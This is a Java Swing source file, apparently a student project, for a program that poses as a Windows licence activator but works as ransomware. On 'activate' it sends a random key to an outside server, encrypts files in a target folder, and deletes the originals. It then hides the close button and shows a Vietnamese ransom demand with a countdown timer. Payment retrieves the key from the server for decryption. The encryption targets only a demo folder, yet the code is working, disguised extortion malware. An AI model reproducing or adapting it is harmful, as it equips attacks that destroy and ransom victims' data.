/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package gui;

import Utils.DateUtils;
import Utils.FileEncryptor;
import Utils.FileUtils;
import com.google.gson.Gson;
import dto.Keys;
import java.awt.Color;
import java.awt.Desktop;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.geom.RoundRectangle2D;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.security.SecureRandom;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.UUID;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.KeyGenerator;
import javax.swing.JLabel;
import javax.swing.JOptionPane;

/**
 *
 * @author mthuan
 */
public class App extends javax.swing.JFrame {
    
    private String urlString = "https://www.google.com";
    private String id;
    private String key;

    /**
     * Creates new form App
     */
    public App() {
        initComponents();
        this.selectVer.removeAllItems();
        this.selectVer.addItem("Windows 10 Pro");
        this.selectVer.addItem("Windows 10 Home");
        this.selectVer.addItem("Windows 10 Enterprise");
        this.selectVer.addItem("Windows 10 Education");
        
        this.decrypt.setVisible(false);
        this.warnning.setVisible(false);
        
        this.instruction.setText("<html>" +"<div style=\"color: red;font-weight: 800; font-family: 'Times New Roman', Times, serif;font-size:12px;\">Dữ liệu của bạn đã bị chúng tôi mã hoá thành dạng không thể sử dụng được để mở hoá dữ liệu bạn cần thực hiện các bước sau đây trong thời gian 30 phút\n" +
"    <ol>\n" +
"        <li>Vui lòng chọn thanh toán để nhận key</li>\n" +
"        <li>Nhập key vào phần mềm vào mọi dữ liệu của bạn sẽ quay về ban đầu</li>\n" +
"    </ol>\n" +
"</div>" +"</html>");
        
      
        
        this.pack();
        this.setLocationRelativeTo(null);
        this.setVisible(true);
        
        this.closeBtn.addMouseListener(new MouseAdapter() {
             public void mouseClicked(MouseEvent e) {
                 int select = JOptionPane.showConfirmDialog(null, "Bạn có muốn thoát ?","Xác nhận thoát",JOptionPane.YES_NO_OPTION);
                 
                 if(select == 0){
                     System.exit(0);
                 }
             }
        });
        
       this.activeBtn.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                //generate cipher key
                
                String randomKey = createRandomKeyString(16);
                
                System.out.println(randomKey);
                
                if(randomKey == null){
                    JOptionPane.showMessageDialog(null, "Kích hoạt thất bại");
                    return;
                }
                Keys keys = new Keys(randomKey);
               
                //Send to server
                boolean isSave = saveToServer(keys);
  
                if(isSave){
                    encryptFile(randomKey);
                     //Hidden close button
                    closeBtn.setVisible(false);
                    //Display warnning
                    warnning.setText("<html><h4 style='color:red;'>Nếu bạn tắt phần mềm mọi dữ liệu sẽ mất VĨNH VIỄN</h4></html>");
                    warnning.setVisible(true);

                    //Move to notification gui
                    body.setVisible(false);
                    decrypt.setVisible(true);
                    
                    CountDown countDown = new CountDown(countDownLabel);
                    new Thread(countDown).start();
                }
               
                
            }

            private void encryptFile(String key) {
                File dir = new File(new File("./filedemo").getAbsolutePath());
                List<String> fileList = FileUtils.readAllFileinFolder(new ArrayList<>(),dir);
                List<String> fillterFileList = FileUtils.fillterFile(fileList);
                
                
                fillterFileList.stream().forEach(path->{
                    try {
                        File inputFile = new File(path);
                        File outputFile = new File(path + ".mahoa");

                        FileEncryptor.encrypt(inputFile, outputFile, key);
                        FileUtils.delete(path);
                    }catch (Exception ex){
                        ex.printStackTrace();
                    }
                });
                

                
            }

            private String createRandomKeyString(int length) {
                 Random random = new Random();
                StringBuilder sb = new StringBuilder(length);
                String CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

                for (int i = 0; i < length; i++) {
                    sb.append(CHARACTERS.charAt(random.nextInt(CHARACTERS.length())));
                }

                return sb.toString();
            }
        });
       
       
       
       
    }
    
    private boolean decryptFile(String key) {
        File dir = new File(new File("./filedemo").getAbsolutePath());
        List<String> fileList = FileUtils.readAllFileinFolder(new ArrayList<>(),dir);
        List<String> fillterFileList = FileUtils.fillterFile(fileList);
        fillterFileList.stream().forEach(path->{
            try {
                String outPath = path.substring(0, path.length() - ".mahoa".length());

                File inputFile = new File(path);
                File outputFile = new File(outPath);

                FileEncryptor.decrypt(inputFile, outputFile, key);
                FileUtils.delete(path);
            }catch (Exception ex){
                ex.printStackTrace();
            }
        });
        
        
        return true;
    }
    
    private boolean saveToServer(Keys keys) {
                try {
                    // Define the API endpoint URL
                    URL url = new URL("https://anninhmang.onrender.com/save");
                    
                    // Create an HTTP connection to the API endpoint
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");

                    // Set the request headers (if any)
                    connection.setRequestProperty("Content-Type", "application/json");
                    

                    // Set the request body
                    String requestBody = new Gson().toJson(keys);
                    
                    
                    
                    byte[] requestBodyBytes = requestBody.getBytes("UTF-8");
                    connection.setDoOutput(true);
                    connection.setRequestProperty("Content-Length", String.valueOf(requestBodyBytes.length));
                    OutputStream outputStream = connection.getOutputStream();
                    outputStream.write(requestBodyBytes);
                    outputStream.flush();
                    outputStream.close();
                    
                    
                    BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    
                    String idResponse = br.readLine().replaceAll("\"", "");
                    
                    this.id = idResponse;
                    
                    
                    return (connection.getResponseCode() == 200) ?true:false;
                    
                } catch (Exception ex) {
                    JOptionPane.showMessageDialog(null, "Kết nối đến server thất bại vui lòng kiểm tra kết nối và thử lại");
                }
                return false;

            }
    
    private void validDecrypt(String id) {
                try {
                    // Define the API endpoint URL
                    URL url = new URL("https://anninhmang.onrender.com/valid");
                    
                    // Create an HTTP connection to the API endpoint
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");

                    // Set the request headers (if any)
                    connection.setRequestProperty("Content-Type", "application/json");
                    

                    // Set the request body
                    String requestBody = "{\"id\":\""+id+"\"}";
                    
                    
                    byte[] requestBodyBytes = requestBody.getBytes("UTF-8");
                    connection.setDoOutput(true);
                    connection.setRequestProperty("Content-Length", String.valueOf(requestBodyBytes.length));
                    OutputStream outputStream = connection.getOutputStream();
                    outputStream.write(requestBodyBytes);
                    outputStream.flush();
                    outputStream.close();
                    
                    
                    BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    
                    if(connection.getResponseCode() == 200){
                        String key = br.readLine();
                        System.out.println(key);
                        JOptionPane.showMessageDialog(null, "Đang giải mã dữ liệu");
                        
                        //Thực hiện giải mã
                        
                        boolean isDecryptSuccess = this.decryptFile(key);
                        
                        if(isDecryptSuccess){
                            JOptionPane.showMessageDialog(null, "Giải mã thành công");
                            System.exit(0);
                        }
                        else{
                            JOptionPane.showMessageDialog(null, "Giải mã bị lỗi");
                        }
                        
                        
                    }
                    else{
                        JOptionPane.showMessageDialog(null, br.readLine());

                    }
                    
                    
                 
                    
                    
                } catch (Exception ex) {
                    ex.printStackTrace();
                    JOptionPane.showMessageDialog(null, "Kết nối đến server thất bại vui lòng kiểm tra kết nối và thử lại");
                }

            }

    
    
    public void removeBody() {
          this.remove(body);
       }
    
    

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        header = new javax.swing.JPanel();
        closeBtn = new javax.swing.JLabel();
        logoBtn = new javax.swing.JLabel();
        warnning = new javax.swing.JLabel();
        body = new javax.swing.JPanel();
        jLabel2 = new javax.swing.JLabel();
        jLabel1 = new javax.swing.JLabel();
        activeBtn = new javax.swing.JButton();
        selectVer = new javax.swing.JComboBox<>();
        jLabel5 = new javax.swing.JLabel();
        jSeparator1 = new javax.swing.JSeparator();
        jLabel6 = new javax.swing.JLabel();
        decrypt = new javax.swing.JPanel();
        instruction = new javax.swing.JLabel();
        paymentBtn = new javax.swing.JButton();
        countDownLabel = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setBackground(new java.awt.Color(250, 244, 244));
        setMinimumSize(new java.awt.Dimension(310, 200));
        setUndecorated(true);
        setSize(new java.awt.Dimension(310, 550));
        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        header.setBackground(new java.awt.Color(255, 255, 255));
        header.setPreferredSize(new java.awt.Dimension(400, 40));

        closeBtn.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icon/icons8-close-window-32.png"))); // NOI18N

        logoBtn.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icon/icons8-windows-10-32.png"))); // NOI18N

        warnning.setText("Nếu bạn đóng chương trình mọi dữ liệu sẽ bị mất vĩnh viễn !!!!");

        javax.swing.GroupLayout headerLayout = new javax.swing.GroupLayout(header);
        header.setLayout(headerLayout);
        headerLayout.setHorizontalGroup(
            headerLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, headerLayout.createSequentialGroup()
                .addGap(70, 70, 70)
                .addComponent(warnning, javax.swing.GroupLayout.PREFERRED_SIZE, 269, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 23, Short.MAX_VALUE)
                .addComponent(closeBtn)
                .addContainerGap())
            .addGroup(headerLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(headerLayout.createSequentialGroup()
                    .addGap(10, 10, 10)
                    .addComponent(logoBtn)
                    .addContainerGap(358, Short.MAX_VALUE)))
        );
        headerLayout.setVerticalGroup(
            headerLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, headerLayout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(headerLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(warnning, javax.swing.GroupLayout.PREFERRED_SIZE, 38, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(closeBtn))
                .addContainerGap())
            .addGroup(headerLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, headerLayout.createSequentialGroup()
                    .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(logoBtn)
                    .addContainerGap()))
        );

        getContentPane().add(header, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 0, -1, 40));

        body.setBackground(new java.awt.Color(255, 255, 255));
        body.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, new java.awt.Color(153, 153, 153), new java.awt.Color(153, 153, 153), new java.awt.Color(153, 153, 153), new java.awt.Color(153, 153, 153)));
        body.setPreferredSize(new java.awt.Dimension(400, 150));
        body.setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());

        jLabel2.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icon/icons8-unlock-security-lock-with-permission-granted-to-access-24.png"))); // NOI18N
        body.add(jLabel2, new org.netbeans.lib.awtextra.AbsoluteConstraints(140, 160, -1, -1));

        jLabel1.setFont(new java.awt.Font("Lucida Grande", 1, 13)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(0, 51, 255));
        jLabel1.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel1.setText("TRÌNH KÍCH HOẠT BẢN QUYỀN WINDOWS");
        body.add(jLabel1, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 10, 400, -1));

        activeBtn.setFont(new java.awt.Font("Lucida Grande", 1, 14)); // NOI18N
        activeBtn.setForeground(new java.awt.Color(0, 153, 255));
        activeBtn.setText("Kích hoạt  ");
        activeBtn.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(51, 153, 255), 1, true));
        activeBtn.setHorizontalAlignment(javax.swing.SwingConstants.RIGHT);
        body.add(activeBtn, new org.netbeans.lib.awtextra.AbsoluteConstraints(130, 150, 120, 40));

        selectVer.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { "Item 1", "Item 2", "Item 3", "Item 4" }));
        body.add(selectVer, new org.netbeans.lib.awtextra.AbsoluteConstraints(80, 90, 240, -1));

        jLabel5.setFont(new java.awt.Font("Lucida Grande", 1, 13)); // NOI18N
        jLabel5.setForeground(new java.awt.Color(0, 153, 255));
        jLabel5.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel5.setText("Vui lòng chọn phiên bản windows:");
        body.add(jLabel5, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 60, 400, -1));
        body.add(jSeparator1, new org.netbeans.lib.awtextra.AbsoluteConstraints(30, 30, 340, 10));

        jLabel6.setIcon(new javax.swing.ImageIcon(getClass().getResource("/icon/icons8-windows-10-32.png"))); // NOI18N
        body.add(jLabel6, new org.netbeans.lib.awtextra.AbsoluteConstraints(20, 60, -1, -1));

        getContentPane().add(body, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 40, -1, 250));

        decrypt.setBackground(new java.awt.Color(255, 255, 255));
        decrypt.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));
        decrypt.setPreferredSize(new java.awt.Dimension(400, 160));

        instruction.setText("jLabel5");

        paymentBtn.setFont(new java.awt.Font("Lucida Grande", 1, 13)); // NOI18N
        paymentBtn.setText("Thanh toán");
        paymentBtn.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                paymentBtnMouseClicked(evt);
            }
        });

        countDownLabel.setFont(new java.awt.Font("Times New Roman", 1, 36)); // NOI18N
        countDownLabel.setForeground(new java.awt.Color(255, 51, 102));
        countDownLabel.setText("99:99");

        javax.swing.GroupLayout decryptLayout = new javax.swing.GroupLayout(decrypt);
        decrypt.setLayout(decryptLayout);
        decryptLayout.setHorizontalGroup(
            decryptLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(decryptLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(decryptLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(decryptLayout.createSequentialGroup()
                        .addComponent(instruction, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addContainerGap())
                    .addGroup(decryptLayout.createSequentialGroup()
                        .addComponent(paymentBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 187, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 69, Short.MAX_VALUE)
                        .addComponent(countDownLabel)
                        .addGap(52, 52, 52))))
        );
        decryptLayout.setVerticalGroup(
            decryptLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, decryptLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(instruction, javax.swing.GroupLayout.DEFAULT_SIZE, 134, Short.MAX_VALUE)
                .addGroup(decryptLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(decryptLayout.createSequentialGroup()
                        .addGap(48, 48, 48)
                        .addComponent(paymentBtn, javax.swing.GroupLayout.PREFERRED_SIZE, 60, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(decryptLayout.createSequentialGroup()
                        .addGap(27, 27, 27)
                        .addComponent(countDownLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 66, javax.swing.GroupLayout.PREFERRED_SIZE))))
        );

        getContentPane().add(decrypt, new org.netbeans.lib.awtextra.AbsoluteConstraints(0, 45, 400, 250));

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void paymentBtnMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_paymentBtnMouseClicked
        // TODO add your handling code here:
        //JOptionPane.showMessageDialog(null, "Cảm ơn bạn đã thanh toán. Dữ liệu của bạn sẽ được giải mã. Mọi chi tiết xin liên hệ 0123456789, hẹn gặp lần sau");
        
        validDecrypt(this.id);
        
    }//GEN-LAST:event_paymentBtnMouseClicked

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(App.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(App.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(App.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(App.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new App().setVisible(true);
            }
        });
    }

    
    
    class CountDown implements Runnable{
        private JLabel time;

        public CountDown(JLabel j) {
            this.time = j;
        }
        
        

        @Override
        public void run() {
            long countTime = 3600;
            while(countTime > 0){
                try{
                    
                    time.setForeground(Color.red);
                    String m=String.valueOf(countTime/60);
                    String s= String.valueOf(countTime - (countTime/60)*60);

                    m = m.length() < 2 ? "0"+m : m;
                    s = s.length() < 2 ? "0"+s : s;

                    String timeFormat = m + ":" + s;

                    time.setText(timeFormat);
                    Thread.sleep(1000);
                    
                    
                    if(countTime <= 300){
                        time.setForeground(Color.BLACK);
                        countTime--;
                        
                        m=String.valueOf(countTime/60);
                        s= String.valueOf(countTime - (countTime/60)*60);

                        m = m.length() < 2 ? "0"+m : m;
                        s = s.length() < 2 ? "0"+s : s;

                        timeFormat = m + ":" + s;

                        time.setText(timeFormat);
                        Thread.sleep(1000);
                        
                    }
                    
                    countTime--;
                }catch(Exception e){
                    
                }
            }
            
        }
        
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton activeBtn;
    private javax.swing.JPanel body;
    private javax.swing.JLabel closeBtn;
    private javax.swing.JLabel countDownLabel;
    private javax.swing.JPanel decrypt;
    private javax.swing.JPanel header;
    private javax.swing.JLabel instruction;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JSeparator jSeparator1;
    private javax.swing.JLabel logoBtn;
    private javax.swing.JButton paymentBtn;
    private javax.swing.JComboBox<String> selectVer;
    private javax.swing.JLabel warnning;
    // End of variables declaration//GEN-END:variables
}

